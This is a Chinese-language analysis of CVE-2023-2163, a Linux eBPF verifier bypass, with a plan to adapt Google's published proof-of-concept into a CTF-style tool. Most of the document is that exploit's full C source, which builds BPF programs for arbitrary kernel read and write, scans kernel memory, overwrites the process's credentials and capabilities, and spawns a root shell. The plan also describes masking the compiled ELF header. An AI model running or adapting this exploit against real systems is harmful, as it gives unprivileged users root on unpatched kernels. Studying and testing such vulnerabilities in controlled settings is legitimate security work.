# CVE-2023-2163 漏洞技术分析与PoC改造计划

## 漏洞概述

| 属性 | 值 |
|------|-----|
| CVE ID | CVE-2023-2163 |
| CVSS | 7.8 |
| 严重等级 | CRITICAL |
| 漏洞类型 | BPF Verifier Bypass |
| 影响内核版本 | 5.x ~ 6.3.x |
| 利用技术 | eBPF verifier分支修剪逻辑缺陷导致不安全路径被标记为安全 |

## 原始PoC分析

### 参考来源
- **PoC URL**: https://github.com/google/security-research/tree/master/pocs/linux/cve-2023-2163
- **来源类型**: GitHub

### 利用原理
eBPF verifier中分支修剪逻辑存在bug，导致不安全的代码路径被错误地标记为安全，允许任意读写获得LPE。Google核心安全研究成果。

该漏洞的触发条件为eBPF verifier分支修剪逻辑缺陷。攻击者通过精心构造的系统调用序列，利用BPF Verifier Bypass类型的缺陷，在内核空间中实现代码执行或数据篡改。

利用过程中，关键的内存操作为绕过验证器后通过BPF实现任意内核读写。最终的提权路径通过利用BPF任意读写修改进程凭证实现LPE完成，使非特权用户获得root权限。

### 关键技术点
1. eBPF verifier分支修剪逻辑缺陷
2. 绕过验证器后通过BPF实现任意内核读写
3. 利用BPF任意读写修改进程凭证实现LPE

## PoC改造计划

### CTF挑战模式适配
- **推荐测试模式**: write_root_file
- **模式选择理由**: BPF verifier bypass可获得任意内核内存读写原语，实现完整LPE提权链

### CLI参数规范化
PoC需支持以下标准CLI参数：
- `--mode`: 测试模式 (read_root_file/write_root_file)
- `--root-file`: root权限目标文件路径
- `--write-value`: write模式的写入值 (ctf{...})
- `--log-file`: syscall日志文件路径
- `--verbose`: 详细输出开关

### 输出协议
CTF协议输出：
```
CTF_FLAG:<value>           // 挑战成功
CTF_FAIL:<reason>          // 漏洞未触发
CTF_UNSUPPORTED:<mode>:<reason> // 不支持的模式
```

### 三阶段验证集成
- **Phase 1 (Prepare)**: 检查BPF子系统和CAP_BPF权限
- **Phase 2 (Run)**: 加载恶意BPF程序利用分支修剪缺陷实现提权
- **Phase 3 (Post)**: 验证提权结果、卸载BPF程序、关闭fd

### Syscall日志记录
关键syscall需要记录到log-file：
- `bpf`
- `close`
- `socket`

## 改造要点

### 核心修改
1. 改造Google security-research PoC为CTF模式
2. 添加CLI参数解析
3. 添加BPF程序清理

### 安全约束
- 执行超时: 30秒
- 禁止 rm -rf
- 禁止写 /etc
- 执行后清理临时ELF

### 编译要求
- 编译器: gcc
- 目标架构: x86_64
- 静态链接: 推荐 `-static`
- ELF掩蔽: 编译后前4字节替换为 `CVE\x00`

## Original PoC Source Code

Source: https://github.com/google/security-research/tree/master/pocs/linux/cve-2023-2163

```c
=== FILE: exploit.c ===
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/prctl.h>


#include "exploit_prims.h"
#include "kernel_helpers.h"

int leak_map_ptr(context *ctx) {
    if (ctx->map_fd < 0) {
        printf("invalid map\n");
        return -1;
    }
    struct bpf_insn instrs[] = {

        CORRUPT_R6,

        BPF_ALU_REG(BPF_MOV, /*dst=*/BPF_REG_9, /*src=*/BPF_REG_1, /*ins_class=*/BPF_ALU64),

        // Store magic number.
        BPF_ALU_IMM(BPF_MOV, /*dst=*/BPF_REG_1, /*imm=*/0x0, /*ins_class=*/BPF_ALU64),
        BPF_ALU_IMM(BPF_LSH, /*dst=*/BPF_REG_1, /*imm=*/32, /*ins_class=*/BPF_ALU64),
        BPF_ALU_IMM(BPF_MOV, /*dst=*/BPF_REG_1, /*imm=*/0xCAFE, /*ins_class=*/BPF_ALU64),
        BPF_MEM_OPERATION(BPF_STX, BPF_DW, /*dst=*/BPF_REG_10, /*src=*/BPF_REG_1, /*offset=*/-8),

        // Store ptr to first magic number on stack
        BPF_ALU_REG(BPF_MOV, /*dst=*/BPF_REG_2, /*src=*/BPF_REG_10, /*ins_class=*/BPF_ALU64),
        BPF_ALU_IMM(BPF_ADD, /*dst=*/BPF_REG_2, /*imm=*/-8, /*ins_class=*/BPF_ALU64),
        BPF_MEM_OPERATION(BPF_STX, BPF_DW, /*dst=*/BPF_REG_10, /*src=*/BPF_REG_2, /*offset=*/-32),

        // Store second magic number.
        BPF_ALU_IMM(BPF_MOV, /*dst=*/BPF_REG_1, /*imm=*/0x0, /*ins_class=*/BPF_ALU64),
        BPF_ALU_IMM(BPF_LSH, /*dst=*/BPF_REG_1, /*imm=*/32, /*ins_class=*/BPF_ALU64),
        BPF_ALU_IMM(BPF_ADD, /*dst=*/BPF_REG_1, /*imm=*/0xBACA, /*ins_class=*/BPF_ALU64),
        BPF_MEM_OPERATION(BPF_STX, BPF_DW, /*dst=*/BPF_REG_10, /*src=*/BPF_REG_1, /*offset=*/-16),

        // Load ptr to map, store in stack.
        BPF_LD_MAP_FD(/*dst=*/BPF_REG_4, ctx->map_fd),
        BPF_MEM_OPERATION(BPF_STX, BPF_DW, /*dst=*/BPF_REG_10, /*src=*/BPF_REG_4, /*offset=*/-24),
        BPF_ALU_REG(BPF_MOV, /*dst=*/BPF_REG_7, /*src=*/BPF_REG_4, /*ins_class=*/BPF_ALU64),

        // Load ptr to first element, save for later
        BPF_ALU_IMM(BPF_MOV, /*dst=*/BPF_REG_0, /*imm=*/0, /*ins_class=*/BPF_ALU64),
        BPF_MEM_OPERATION(BPF_STX, BPF_DW, /*dst=*/BPF_REG_10, /*src=*/BPF_REG_0, /*offset=*/-40),
        BPF_ALU_REG(BPF_MOV, /*dst=*/BPF_REG_1, /*src=*/BPF_REG_4, /*ins_class=*/BPF_ALU64),
        BPF_ALU_REG(BPF_MOV, /*dst=*/BPF_REG_2, /*src=*/BPF_REG_10, /*ins_class=*/BPF_ALU64),
        BPF_ALU_IMM(BPF_ADD, /*dst=*/BPF_REG_2, /*imm=*/-36, /*ins_class=*/BPF_ALU64),
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JNE, /*dst=*/BPF_REG_0, /*imm=*/BPF_REG_0, /*off=*/BPF_REG_1, /*ins_class=*/BPF_JMP),
        BPF_EXIT_INSN(),
        BPF_ALU_REG(BPF_MOV, /*dst=*/BPF_REG_8, /*src=*/BPF_REG_0, /*ins_class=*/BPF_ALU64),

        // Corrupt stack ptr with packet data.

        BPF_ALU_REG(BPF_MOV, BPF_REG_1, BPF_REG_9, BPF_ALU64),
        BPF_ALU_IMM(BPF_MOV, BPF_REG_2, 0, BPF_ALU64),
        BPF_ALU_REG(BPF_MOV, BPF_REG_3, BPF_REG_10, BPF_ALU64),
        BPF_ALU_IMM(BPF_ADD, BPF_REG_3, -40, BPF_ALU64),
        BPF_ALU_REG(BPF_MOV, BPF_REG_4, BPF_REG_6, BPF_ALU64),
        BPF_ALU_IMM(BPF_ADD, BPF_REG_4, 8, BPF_ALU64),
        BPF_ALU_IMM(BPF_MOV, BPF_REG_5, 1, BPF_ALU64),
        BPF_CALL_FUNC(BPF_FUNC_skb_load_bytes_relative),


        BPF_ALU_IMM(BPF_MOV, /*dst=*/BPF_REG_0, /*imm=*/1, /*ins_class=*/BPF_ALU),
        BPF_MEM_OPERATION(BPF_STX, BPF_W, /*dst=*/BPF_REG_10, /*src=*/BPF_REG_0, /*offset=*/-36),
        BPF_ALU_REG(BPF_MOV, /*dst=*/BPF_REG_1, /*src=*/BPF_REG_7, /*ins_class=*/BPF_ALU64),
        BPF_ALU_REG(BPF_MOV, /*dst=*/BPF_REG_2, /*src=*/BPF_REG_10, /*ins_class=*/BPF_ALU64),
        BPF_ALU_IMM(BPF_ADD, /*dst=*/BPF_REG_2, /*imm=*/-36, /*ins_class=*/BPF_ALU64),
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JNE, /*dst=*/BPF_REG_0, /*imm=*/BPF_REG_0, /*off=*/BPF_REG_1, /*ins_class=*/BPF_JMP),
        BPF_EXIT_INSN(),

        BPF_MEM_OPERATION(BPF_LDX, BPF_DW, /*dst=*/BPF_REG_1, /*src=*/BPF_REG_10, /*offset=*/-32),
        BPF_MEM_OPERATION(BPF_LDX, BPF_DW, /*dst=*/BPF_REG_2, /*src=*/BPF_REG_1, /*offset=*/0),
        BPF_MEM_OPERATION(BPF_STX, BPF_DW, /*dst=*/BPF_REG_0, /*src=*/BPF_REG_2, /*offset=*/0),

        BPF_MEM_OPERATION(BPF_LDX, BPF_DW, /*dst=*/BPF_REG_2, /*src=*/BPF_REG_1, /*offset=*/-8),
        BPF_MEM_OPERATION(BPF_STX, BPF_DW, /*dst=*/BPF_REG_8, /*src=*/BPF_REG_2, /*offset=*/0),

        BPF_ALU_IMM(BPF_MOV, /*dst=*/BPF_REG_0, /*imm=*/BPF_REG_0, /*ins_class=*/BPF_ALU64),
        BPF_EXIT_INSN()
    };

    int prog_fd =load_prog(instrs, /*prog_len=*/sizeof(instrs) / sizeof(instrs[0]));
    if ( prog_fd < 0) {
        printf("Could not load program\n");
        return -1;
    }

    int offset = 0;
    int max_attempts = 256 * 256;

    uint64_t map_contents[ctx->map_size];
    memset(map_contents, 0, sizeof(map_contents));

    while (max_attempts != 0) {
        max_attempts--;
        offset+=8;
        offset %= 256;

        uint8_t data[100];
        memset(data, offset, sizeof(data));
        if (execute_bpf_program(ctx, prog_fd, map_contents, data, 100) != 0) {
            printf("Failed to execute program");
            return -1;
        }
        if (map_contents[1] == 0xbaca) {
            ctx->map_leak = map_contents[0];
            break;
        }
    }

    if (max_attempts == 0) {
        return -1;
    }

    close(prog_fd);
    return 0;
}


int load_kernel_page(context *ctx, uint64_t start_address) {
    if (ctx->kernel_memory == NULL) {
        ctx->kernel_memory = malloc(ctx->kernel_page_size);
        ctx->kernel_allocated_pages = 1;

    } else {
        ctx->kernel_memory = realloc(ctx->kernel_memory, ctx->kernel_page_size * (ctx->kernel_allocated_pages + 1));
        ctx->kernel_allocated_pages++;
    }

    if (!ctx->kernel_memory) {
        printf("Failed to allocate kernel memory page");
        return -1;
    }

    int index = (ctx->kernel_allocated_pages - 1) * (ctx->kernel_page_size);
    index = index/(sizeof(uint64_t));
    uint64_t *kernel_memory = (uint64_t*)ctx->kernel_memory;
    for (uint64_t i = 0; i < ctx->kernel_page_size; i+=8, index++) {
        uint64_t leak_value;
        if (read_from_address(ctx, start_address + i, &leak_value) != 0) {
            printf("could failed to read memory address while leaking kernel page\n");
            return -1;
        }
        kernel_memory[index] = leak_value; 
    }
    return 0; 

}

int leak_init_pid_ns_offset(context *ctx) {
    char init_pid_str[] = "init_pid";
    for (uint64_t i = 0; i < 0xFFFFFFF; i += ctx->kernel_page_size) {
        int kernel_page_no = i/ctx->kernel_page_size;
        if (kernel_page_no % 0x100 == 0) {
            printf("Ping! looking at kernel page no 0x%02x, next ping at page no: 0x%02x\n", kernel_page_no, kernel_page_no + 0x100);
        }
        if (load_kernel_page(ctx, ctx->ops_leak + i) < 0) {
            printf("failed to load initial kernel page\n");
            return -1;
        }
        char *page = (char *)(ctx->kernel_memory + i);
        int str_len = strlen(init_pid_str);
        for(int j = 0; j < (ctx->kernel_page_size - str_len); j++) {
            char *offset = page+j;
            if (strncmp(init_pid_str, (const char*)offset, str_len) == 0) {
                uint64_t init_pid_str_offset = (uint64_t) (offset - (char *)ctx->kernel_memory);
                printf("[+] found offset at: %lx\n", init_pid_str_offset);
                ctx->init_proc_ns_kstrtab = ctx->ops_leak + init_pid_str_offset;
                return 0;
            }
        }

    }
    return -1;
}

int find_init_pid_ns(context *ctx) {
    uint64_t memory_size = (ctx->kernel_page_size * ctx->kernel_allocated_pages);
    uint64_t kstrtab_addr = ctx->init_proc_ns_kstrtab;
    uint64_t start_addr = ctx->ops_leak;
    for (uint64_t i = 0; i < memory_size; i++, start_addr++) {
        uint32_t offset = *(uint32_t *)(ctx->kernel_memory + i);
        if (kstrtab_addr == start_addr + offset) {
            uint32_t value_offset = *(uint32_t*)(ctx->kernel_memory + i - 0x4);
            ctx->init_proc_ns_addr = start_addr + value_offset - 0x4;
            return 0;
        }
    }
    return -1;
}

int find_process_and_leak_credentials_container(context *ctx) {
    const char new_prog_name[] = "exploit";
    uint64_t task_list_offset = 0x5c8;
    uint64_t task_cred_offset = 0x720;
    if (prctl(PR_SET_NAME, new_prog_name, 0, 0, 0) != 0) {
        printf("could not set name\n");
    }

    uint64_t pid_struct, i, task_addr;
    uint64_t max_pid = 4 * 1024 * 1024;
    for (i = 1; i < max_pid; i++) {
        if (i % 10000 == 0) {
            printf("ping! looking at pid %ld\n", i);
        }
        pid_struct = (uint64_t) find_pid_ns(ctx, i);

        uint64_t pid_tasks_offset = 0x10;
        uint64_t first;

        if (i == 1 && !pid_struct) {
            printf("[-] could not leak pid struct of init_ps\n");
            return -1;
        }

        if (!pid_struct) continue;

        if (read_from_address(ctx, pid_struct + pid_tasks_offset, &first) != 0) {
            printf("[-] could not leak pid_struct tasks member addr\n");
            return -1;
        }

        if (!first) continue;
        task_addr = first - task_list_offset;
        uint64_t comm_addr = task_addr + 0x730; 

        if (i == 1) {
            uint64_t fs_offset = 0x760;
            if (read_from_address(ctx, task_addr + fs_offset, &ctx->init_pid_fs) != 0) {
                printf("[-] could not leak init_pid fs\n");
                return -1;
            }

            printf("[+] init pid fs: %lx\n", ctx->init_pid_fs);
            uint64_t init_pid_creds;
            if (read_from_address(ctx, task_addr + task_cred_offset, &init_pid_creds) != 0) {
                printf("[-] could not leak ini pid creds addr\n");
                return -1;
            }

            uint64_t cap_inh_off = 0x28;
            if (read_from_address(ctx, init_pid_creds + cap_inh_off, &ctx->init_pid_cap_inh) != 0) {
                printf("[-] could not leak cap inh\n");
                return -1;
            }
            printf("[+] init pid cap inh: %lx\n", ctx->init_pid_cap_inh);

            if (read_from_address(ctx, init_pid_creds + cap_inh_off + 0x8, &ctx->init_pid_cap_perm) != 0) {
                printf("[-] could not leak cap perm\n");
                return -1;
            }
            printf("[+] init pid cap perm: %lx\n", ctx->init_pid_cap_perm);

            if (read_from_address(ctx, init_pid_creds + cap_inh_off + 0x10, &ctx->init_pid_cap_eff) != 0) {
                printf("[-] could not leak cap eff\n");
                return -1;
            }
            printf("[+] init pid cap eff: %lx\n", ctx->init_pid_cap_eff);


        }

        char task_name[16];
        memset(task_name, 0, 16);
        if (kernel_read_bytes(ctx, comm_addr, task_name, 16) != 0) {
            printf("[-] could not read task name\n");
            return -1;
        }
        if (strcmp(task_name, new_prog_name) == 0) {
            printf("[+] found task\n");
            break;
        }
    }

    if (i == max_pid) {
        printf("[-] could not get pid_struct for process %ld", i);
        return -1;
    }

    printf("[+] pid struct for process %ld is at %lx\n", i, pid_struct);

    ctx->task_addr = task_addr;
    printf("[+] task_struct %lx\n", ctx->task_addr);

    if (read_from_address(ctx, ctx->task_addr + task_cred_offset, &ctx->creds_addr) != 0) {
        printf("[-] could not leak creds addr\n");
        return -1;
    }
    return 0;

}

int find_process_and_leak_credentials(context *ctx) {
    const char new_prog_name[] = "k3rn3lh4x";
    if (prctl(PR_SET_NAME, new_prog_name, 0, 0, 0) != 0) {
        printf("could not set name\n");
    }

    uint64_t pid_struct = (uint64_t) find_pid_ns(ctx, getpid());

    if (pid_struct == 0) {
        printf("[-] could not get pid_struct for process %d", getpid());
        return -1;
    }
    printf("[+] pid struct for process %d is at %lx\n", getpid(), pid_struct);

    uint64_t pid_tasks_offset = 0x10;
    uint64_t first;
    if (read_from_address(ctx, pid_struct + pid_tasks_offset, &first) != 0) {
        printf("[-] could not leak pid_struct tasks member addr\n");
        return -1;
    }

    printf("[+] first at %lx\n", first);
    uint64_t task_list_offset = 0x5c8;
    uint64_t task_cred_offset = 0x720;
    ctx->task_addr = first - task_list_offset;
    printf("[+] task_struct %lx\n", ctx->task_addr);

    if (read_from_address(ctx, ctx->task_addr + task_cred_offset, &ctx->creds_addr) != 0) {
        printf("[-] could not leak creds addr\n");
    }
    return 0;

}

int main() {

    context ctx;
    ctx.map_size = 4;
    ctx.map_fd = bpf_create_map(ctx.map_size);
    ctx.kernel_memory = NULL;
    ctx.kernel_page_size = 0x1000;
    ctx.kernel_allocated_pages = 1;

    if (ctx.map_fd < 0) {
        printf("could not create bpf map\n");
        return -1;
    }

    if (leak_map_ptr(&ctx) != 0) {
        printf("[-] Could not leak map!");
        return -1;
    }
    printf("[+] map_leak %lx\n", ctx.map_leak);

    if (prepare_read(&ctx) != 0) {
        printf("could not load program for arbitrary read\n");
        return -1;
    }

    if (read_from_address(&ctx, ctx.map_leak, &ctx.ops_leak) != 0) {
        printf("[-] Could not leak map_ops!\n");
        return -1;
    }

    printf("[+] ops = %02lx\n", ctx.ops_leak);
    printf("Attempting to find init_pid_ns string offset.. this will take a while, standby\n");
    if(leak_init_pid_ns_offset(&ctx) != 0) {
        printf("[-] could not find init_pid_ns offset!");
        return -1;
    }
    printf("[+] init_pid_ns string offset: %lx\n", ctx.init_proc_ns_kstrtab);

    if (find_init_pid_ns(&ctx) != 0) {
        printf("[-] could not find init_pid_ns address!");
        return -1;
    }
    printf("[+] init_pid_ns address: %lx\n", ctx.init_proc_ns_addr);

    printf("[.] Attempting to find pid cred %d\n", getpid());

    if(find_process_and_leak_credentials_container(&ctx) != 0 ) {
        printf("[-] Could not leak process credentials\n");
        return -1;
    }
    printf("[+] process credentials at: %lx\n", ctx.creds_addr);

    if (write_to_address(&ctx, ctx.creds_addr + 0x4, 0) != 0) {
        printf("[-] Could not patch credentials!\n");
        return -1;
    }
    
    uint64_t fs_offset = 0x760;
    uint64_t cap_inh_off = 0x28;
   
    if (write_to_address(&ctx, ctx.task_addr + fs_offset, ctx.init_pid_fs) != 0) {
        printf("[-] Could not patch credentials!\n");
        return -1;
    }

    if (write_to_address(&ctx, ctx.creds_addr + cap_inh_off, ctx.init_pid_cap_inh) != 0) {
        printf("[-] Could not patch credentials!\n");
        return -1;
    }

    if (write_to_address(&ctx, ctx.creds_addr + cap_inh_off + 0x8, ctx.init_pid_cap_perm) != 0) {
        printf("[-] Could not patch credentials!\n");
        return -1;
    }

    if (write_to_address(&ctx, ctx.creds_addr + cap_inh_off + 0x10, ctx.init_pid_cap_eff) != 0) {
        printf("[-] Could not patch credentials!\n");
        return -1;
    }

    if (getuid() == 0) {
        printf("Kernel has been pwned, standby for root shell\n");
        system("/bin/bash");
    }


    return 0;
}

=== FILE: exploit_prims.c ===
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

#include "exploit_prims.h"

// loads a prog and returns the FD
int load_prog(struct bpf_insn *instructions, size_t insn_count)
{
    unsigned char log_buf[1000000] = {};
    memset(log_buf, 0, 1000000);
    union bpf_attr attr = {};
    attr.prog_type = BPF_PROG_TYPE_SOCKET_FILTER;
    attr.insns = (uint64_t)instructions;
    attr.insn_cnt = insn_count;
    attr.license = (uint64_t) "GPL";
    attr.log_size = sizeof(log_buf);
    attr.log_buf = (uint64_t)log_buf;
    attr.log_level = 3;

    // load the BPF program
    int prog_fd = syscall(SYS_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));

    if (prog_fd < 0) {
        for (int i = 0; i < sizeof(log_buf) && log_buf[i] != '\0'; i++) {
            if (log_buf[i] != '\n') {
                printf("%c",log_buf[i]);
            } else {
                printf("\n");
            }
        }     
        printf("%s\n", strerror(errno));
        printf("could load program\n");

        return -1;
    }

    return prog_fd;
}

int bpf_create_map(unsigned int max_entries) {
    union bpf_attr attr = {.map_type = BPF_MAP_TYPE_ARRAY,
        .key_size = sizeof(uint32_t),
        .value_size = sizeof(uint64_t),
        .max_entries = max_entries};

    return syscall(SYS_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
}

int get_map_contents(context *ctx, uint64_t *contents) {
    for (uint64_t key = 0; key < ctx->map_size; key++) {
        uint64_t element = 0;
        union bpf_attr lookup_map = {.map_fd = (uint32_t)ctx->map_fd,
            .key = (uint64_t)&key,
            .value = (uint64_t)&element};
        int err =
            syscall(SYS_bpf, BPF_MAP_LOOKUP_ELEM, &lookup_map, sizeof(lookup_map));
        if (err < 0) {
            printf("could not read value from map\n");
            return -1;
        }
        contents[key] = element;
    }
    return 0;
}

int setup_send_sock() {
    return socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
}

int setup_listener_sock() {
    int sock_fd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK | SOCK_CLOEXEC, 0);
    if (sock_fd < 0) {
        return sock_fd;
    }

    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(1337);
    serverAddr.sin_addr.s_addr = htonl(INADDR_ANY);

    int err = bind(sock_fd, (struct sockaddr *)&serverAddr, sizeof(serverAddr));
    if (err < 0) return err;

    err = listen(sock_fd, 32);
    if (err < 0) return err;

    return sock_fd;
}

int bpf_prog_skb_run(int prog_fd, const void *data, size_t size) {
    int err, socks[2] = {};

    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks) != 0)
        return errno;

    if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF,
                &prog_fd, sizeof(prog_fd)) != 0)
    {
        err = errno;
        goto abort;
    }

    if (write(socks[1], data, size) != size)
    {
        err = -1;
        goto abort;
    }

    err = 0;

abort:
    close(socks[0]);
    close(socks[1]);
    return err;
}

int execute_bpf_program(context* ctx, int prog_fd, uint64_t *map_contents, void *data, int data_len) {
    if (bpf_prog_skb_run(prog_fd, data, data_len) != 0) {
        printf("Could not execute bpf program\n");
        return -1;
    }

    if (map_contents != NULL) {
        if (get_map_contents(ctx, map_contents) != 0) {
            printf("could not get map contents\n");
            return -1;
        }
    }

    return 0;
}

int prepare_read(context *ctx) {
    if (ctx->map_fd < 0) {
        printf("invalid map\n");
        return -1;
    }

    struct bpf_insn instrs[] = {
        CORRUPT_STACK_PTR,

        BPF_MEM_OPERATION(BPF_LDX, BPF_DW, BPF_REG_8, BPF_REG_1, 0),

        // Load ptr to map element 0, we'll write the value read from the
        // arbitrary pointer there.
        BPF_ALU_IMM(BPF_MOV, /*dst=*/BPF_REG_0, /*imm=*/0, /*ins_class=*/BPF_ALU64),
        BPF_MEM_OPERATION(BPF_STX, BPF_DW, /*dst=*/BPF_REG_10, /*src=*/BPF_REG_0, /*offset=*/-32),
        BPF_LD_MAP_FD(/*dst=*/BPF_REG_4, ctx->map_fd),
        BPF_ALU_REG(BPF_MOV, /*dst=*/BPF_REG_1, /*src=*/BPF_REG_4, /*ins_class=*/BPF_ALU64),
        BPF_ALU_REG(BPF_MOV, /*dst=*/BPF_REG_2, /*src=*/BPF_REG_10, /*ins_class=*/BPF_ALU64),
        BPF_ALU_IMM(BPF_ADD, /*dst=*/BPF_REG_2, /*imm=*/-28, /*ins_class=*/BPF_ALU64),
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JNE, /*dst=*/BPF_REG_0, /*imm=*/BPF_REG_0, /*off=*/BPF_REG_1, /*ins_class=*/BPF_JMP),
        BPF_EXIT_INSN(),
        BPF_MEM_OPERATION(BPF_STX, BPF_DW, /*dst=*/BPF_REG_0, /*src=*/BPF_REG_8, /*offset=*/0),

        BPF_ALU_IMM(BPF_MOV, /*dst=*/BPF_REG_0, /*imm=*/BPF_REG_0, /*ins_class=*/BPF_ALU64),
        BPF_EXIT_INSN()
    };

    int prog_fd =load_prog(instrs, /*prog_len=*/sizeof(instrs) / sizeof(instrs[0]));
    if ( prog_fd < 0) {
        printf("Could not load program\n");
        return -1;
    }

    ctx->read_fd = prog_fd;
    return 0;
}

int write_to_address(context *ctx, uint64_t target_address, uint64_t value) {
    if (ctx->map_fd < 0) {
        printf("invalid map\n");
        return -1;
    }
    uint32_t lower_half_write = (uint32_t)(value & 0x00000000FFFFFFFF);
    uint32_t upper_half_write = (uint32_t)((value & 0xFFFFFFFF00000000)>>32);

    if ((int32_t)lower_half_write < 0) {
        upper_half_write +=1;
    }
    struct bpf_insn instrs[] = {
        CORRUPT_STACK_PTR,

        // Write to corrupted ptr.
        BPF_ALU_IMM(BPF_MOV, /*dst=*/BPF_REG_2, /*imm=*/upper_half_write, /*ins_class=*/BPF_ALU64),
        BPF_ALU_IMM(BPF_LSH, /*dst=*/BPF_REG_2, /*imm=*/32, /*ins_class=*/BPF_ALU64),
        BPF_ALU_IMM(BPF_ADD, /*dst=*/BPF_REG_2, /*imm=*/lower_half_write, /*ins_class=*/BPF_ALU64),
        BPF_MEM_OPERATION(BPF_STX, BPF_DW, /*dst=*/BPF_REG_1, /*src=*/BPF_REG_2, /*offset=*/0),

        BPF_ALU_IMM(BPF_MOV, /*dst=*/BPF_REG_0, /*imm=*/BPF_REG_0, /*ins_class=*/BPF_ALU64),
        BPF_EXIT_INSN()
    };

    int prog_fd =load_prog(instrs, /*prog_len=*/sizeof(instrs) / sizeof(instrs[0]));
    if ( prog_fd < 0) {
        printf("Could not load program\n");
        return -1;
    }
    uint64_t data[2];
    data[0] = 0xAAAAAAAAAAAAAAAA;
    data[1] = target_address;
    if (execute_bpf_program(ctx, prog_fd, NULL, data, sizeof(data) * sizeof(data[0])) != 0) {
        printf("Failed to execute program");
        return -1;
    }
    close(prog_fd);
    return 0;
}

int read_from_address(context *ctx, uint64_t target_address, uint64_t* value) {
    if (ctx->read_fd <0) {
        printf("invalid read bpf program!\n");
        return -1;
    }

    uint64_t data[2];
    data[0] = 0xAAAAAAAAAAAAAAAA;
    data[1] = target_address;
    if (execute_bpf_program(ctx, ctx->read_fd, NULL, data, sizeof(data) * sizeof(data[0])) != 0) {
        printf("Failed to execute program");
        return -1;
    }
    uint64_t map_contents[ctx->map_size];
    if (get_map_contents(ctx, map_contents) != 0) {
        printf("could not read map contents in main\n");
        return -1;
    }
    *value = map_contents[0];
    return 0;
}

int kernel_read_bytes(context *ctx, uint64_t target_address, void *destination, uint64_t size) {
    uint64_t read_amount = (size / sizeof(uint64_t));
    if (size % 8 != 0) {
        read_amount++;
    }

    uint64_t values_read[read_amount];
    for(uint64_t i = 0; i < read_amount; i++, target_address += 8) {
       if (read_from_address(ctx, target_address, &values_read[i]) != 0 ){
         printf("failed to read value no. %ld\n", i);
         return -1;
       }
    }

    memcpy(destination, (void*)values_read, size);
    return 0;
}

=== FILE: kernel_helpers.c ===
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <sys/user.h>

#include "exploit_prims.h"
#include "kernel_helpers.h"

static inline unsigned long shift_maxindex(unsigned int shift)
{
    return (RADIX_TREE_MAP_SIZE << shift) - 1;
}

static inline unsigned long node_maxindex(const struct radix_tree_node *node)
{
    return shift_maxindex(node->shift);
}

static inline struct radix_tree_node *entry_to_node(void *ptr)
{
    return (void *)((unsigned long)ptr & ~RADIX_TREE_INTERNAL_NODE);
}

static inline bool radix_tree_is_internal_node(void *ptr)
{
    return ((unsigned long)ptr & RADIX_TREE_ENTRY_MASK) ==
                RADIX_TREE_INTERNAL_NODE;
}

static unsigned int radix_tree_descend(context* ctx, const struct radix_tree_node *parent,
            struct radix_tree_node **nodep, unsigned long index)
{
    unsigned int offset = 0;
    void **entry = NULL;
    struct radix_tree_node node_in = {0};

    kernel_read_bytes(ctx, (uint64_t)parent, (void*)&node_in, sizeof(node_in));
    offset = (index >> node_in.shift) & RADIX_TREE_MAP_MASK;

    entry = node_in.slots[offset];

    *nodep = (void *)entry;
    return offset;
}

static unsigned radix_tree_load_root(context* ctx, const struct radix_tree_root *root,
        struct radix_tree_node **nodep, unsigned long *maxindex)
{
    struct radix_tree_node *node = root->xa_head;
    struct radix_tree_node node_in = {0};
    *nodep = node;

    if (radix_tree_is_internal_node(node))
    {
        node = entry_to_node(node);
        kernel_read_bytes(ctx, (uint64_t)node, (void*)&node_in, sizeof(node_in));
        *maxindex = node_maxindex(&node_in);
        return node_in.shift + RADIX_TREE_MAP_SHIFT;
    }

    *maxindex = 0;
    return 0;
}

void *__radix_tree_lookup(context* ctx, const struct radix_tree_root *root,
              unsigned long index, struct radix_tree_node **nodep,
              void ***slotp)
{
    struct radix_tree_node *node, *parent;
    unsigned long maxindex;
    void **slot;
    struct radix_tree_node node_in = {0};

 restart:
    parent = NULL;
    slot = (void **)&root->xa_head;
    radix_tree_load_root(ctx, root, &node, &maxindex);

    if (index > maxindex)
        return NULL;

    while (radix_tree_is_internal_node(node)) {
        unsigned offset;

        parent = entry_to_node(node);
        offset = radix_tree_descend(ctx, parent, &node, index);
        kernel_read_bytes(ctx, (uint64_t)parent, (void*)&node_in, sizeof(node_in));
        slot = node_in.slots + offset;
        if (node == RADIX_TREE_RETRY)
            goto restart;
        if (node_in.shift == 0)
            break;
    }

    if (nodep)
        *nodep = parent;
    if (slotp)
        *slotp = slot;
    return node;
}

void *radix_tree_lookup(context* ctx, const struct radix_tree_root *root, unsigned long index)
{
    return __radix_tree_lookup(ctx, root, index, NULL, NULL);
}

void *idr_find(context* ctx, const struct idr *idr, unsigned long id)
{
    return radix_tree_lookup(ctx, &idr->idr_rt, id - idr->idr_base);
}

struct pid *find_pid_ns(context* ctx, int process_number)
{
    struct pid_namespace ns = {0};

    kernel_read_bytes(ctx, ctx->init_proc_ns_addr, (void*)&ns, sizeof(ns));

    return idr_find(ctx, &ns.idr, process_number);
}

=== FILE: include/exploit_prims.h ===
#ifndef _EXPLOIT_PRIMS_

#include <linux/bpf.h>

#define _EXPLOIT_PRIMS_
#define BPF_ALU_IMM(OP, DST, IMM, INS_CLASS)				\
    ((struct bpf_insn) {					\
     .code  = INS_CLASS | BPF_OP(OP) | BPF_K,	\
     .dst_reg = DST,					\
     .src_reg = 0,					\
     .off   = 0,					\
     .imm   = IMM })

